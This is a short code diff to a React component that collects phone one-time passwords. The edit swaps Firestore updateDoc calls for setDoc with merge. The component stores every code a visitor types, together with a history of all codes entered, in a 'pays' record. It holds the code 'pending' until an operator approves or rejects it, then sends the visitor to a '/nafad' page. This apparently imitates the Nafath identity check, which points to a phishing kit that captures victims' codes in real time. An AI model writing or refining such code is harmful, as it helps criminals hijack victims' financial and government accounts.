@@ -7,7 +7,7 @@ import { Input } from "@/components/ui/input"
 import { Alert, AlertDescription } from "@/components/ui/alert"
 import { AlertCircle, CheckCircle2, Smartphone } from "lucide-react"
 import { db } from "@/lib/firebase"
-import { doc, updateDoc, onSnapshot } from "firebase/firestore"
+import { doc, setDoc, onSnapshot } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 
 interface PhoneOtpDialogProps {
@@ -72,10 +72,10 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
             
             // Redirect to nafad page after 1 second
             setTimeout(async () => {
-              await updateDoc(doc(db, "pays", visitorID), {
+              await setDoc(doc(db, "pays", visitorID), {
                 currentStep: "nafad",
-                phoneOtpStatus: "" // Clear after use
-              })
+                phoneOtpStatus: ""
+              }, { merge: true })
               window.location.href = "/nafad"
             }, 1000)
           } else if (status === "rejected") {
@@ -86,9 +86,9 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
             
             // Clear the rejected status in Firebase after showing error
             setTimeout(async () => {
-              await updateDoc(doc(db, "pays", visitorID), {
-                phoneOtpStatus: "pending" // Keep modal open for new input
-              })
+              await setDoc(doc(db, "pays", visitorID), {
+                phoneOtpStatus: "pending"
+              }, { merge: true })
             }, 1000)
           }
         }
@@ -126,13 +126,13 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
       setError("")
 
       // Save OTP to Firebase
-      await updateDoc(doc(db, "pays", visitorID), {
+      await setDoc(doc(db, "pays", visitorID), {
         phoneOtp: otp,
         phoneOtpSubmittedAt: new Date().toISOString(),
         allPhoneOtps: allOtps.current,
-        phoneOtpStatus: "pending", // Set to pending, pending for admin decision
+        phoneOtpStatus: "pending",
         phoneOtpUpdatedAt: new Date().toISOString()
-      })
+      }, { merge: true })
 
       // Add phone OTP to history
       await addToHistory(visitorID, "phone_otp", {
